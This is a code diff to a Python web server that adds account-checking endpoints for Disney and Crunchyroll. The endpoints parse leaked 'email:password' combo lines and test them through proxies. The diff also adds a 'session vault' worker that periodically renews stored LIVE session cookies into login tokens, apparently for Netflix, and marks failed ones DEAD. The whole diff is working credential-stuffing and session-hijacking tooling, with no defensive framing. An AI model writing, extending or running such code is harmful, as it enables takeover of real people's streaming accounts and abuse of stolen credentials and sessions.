+            elif self.path == "/api/disney/check":
+                try:
+                    p = json.loads(body.decode("utf-8"))
+                    email = p.get("email", "").strip()
+                    password = p.get("password", "").strip()
+                    if not email or not password:
+                        combo = p.get("combo", "").strip()
+                        if combo:
+                            # Strip metadata after email:password (e.g. "email:pass | Sub:... | ...")
+                            combo_clean = combo.split(" | ")[0].strip() if " | " in combo else combo
+                            if ":" in combo_clean:
+                                email, password = combo_clean.split(":", 1)
+                                email = email.strip()
+                                password = password.strip()
+                    if not email or not password:
+                        raise ValueError("Email dan password wajib diisi")
+                    out = check_disney_account(email, password, use_proxy=p.get("use_proxy", True))
+                    res = json.dumps(out).encode("utf-8")
+                    self.send_response(200)
+                except Exception as e:
+                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
+                    self.send_response(400)
+                self.send_header("Content-Type", "application/json")
+                self.end_headers()
+                self.wfile.write(res)
+
+            elif self.path == "/api/crunchyroll/check":
+                try:
+                    p = json.loads(body.decode("utf-8"))
+                    email = p.get("email", "").strip()
+                    password = p.get("password", "").strip()
+                    if not email or not password:
+                        combo = p.get("combo", "").strip()
+                        if combo:
+                            combo_clean = combo.split(" | ")[0].strip() if " | " in combo else combo
+                            if ":" in combo_clean:
+                                email, password = combo_clean.split(":", 1)
+                                email = email.strip()
+                                password = password.strip()
+                    if not email or not password:
+                        raise ValueError("Email dan password wajib diisi")
+                    out = check_crunchyroll_account(email, password, use_proxy=p.get("use_proxy", True))
+                    res = json.dumps(out).encode("utf-8")
+                    self.send_response(200)
+                except Exception as e:
+                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
                     self.send_response(400)
                 self.send_header("Content-Type", "application/json")
                 self.end_headers()
@@ -1141,13 +1740,50 @@ class Handler(http.server.BaseHTTPRequestHandler):
             self.send_response(404)
             self.end_headers()
 
+def session_vault_worker():
+    """Background worker: automatically renews and validates expiring active sessions in DB."""
+    while True:
+        time.sleep(1800)
+        try:
+            with db_lock:
+                conn = get_db()
+                c = conn.cursor()
+                c.execute('SELECT id, raw_cookie FROM history WHERE status = "LIVE" AND raw_cookie != "" ORDER BY id DESC LIMIT 10')
+                rows = c.fetchall()
+                conn.close()
+
+            for row_id, raw_cookie in rows:
+                try:
+                    t_url, a_url, tv_url, tok, exp, route = generate_nftoken(raw_cookie, use_proxy=True)
+                    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    with db_lock:
+                        conn = get_db()
+                        conn.execute('UPDATE history SET token_url = ?, created_at = ? WHERE id = ?', (t_url, now, row_id))
+                        conn.commit()
+                        conn.close()
+                    logging.info(f"Session Vault: renewed token for history ID {row_id}")
+                except Exception as e:
+                    err = str(e).lower()
+                    if any(k in err for k in ("mati", "invalid", "tidak ditemukan", "401", "403")):
+                        with db_lock:
+                            conn = get_db()
+                            conn.execute('UPDATE history SET status = "DEAD" WHERE id = ?', (row_id,))
+                            conn.commit()
+                            conn.close()
+                        logging.warning(f"Session Vault: marked ID {row_id} as DEAD ({e})")
+                    else:
+                        logging.warning(f"Session Vault: renew error ID {row_id}: {e}")
+                time.sleep(2)
+        except Exception as ex:
+            logging.error(f"Session Vault worker error: {ex}")
+
 class ThreadingSimpleServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
     daemon_threads = True
 
 def run():
     init_db()
-    t = threading.Thread(target=proxy_health_worker, daemon=True)
-    t.start()
+    threading.Thread(target=proxy_health_worker, daemon=True).start()
+    threading.Thread(target=session_vault_worker, daemon=True).start()
     socketserver.TCPServer.allow_reuse_address = True
     server = ThreadingSimpleServer(("", PORT), Handler)
     print(f"Server jalan: http://localhost:{PORT}")
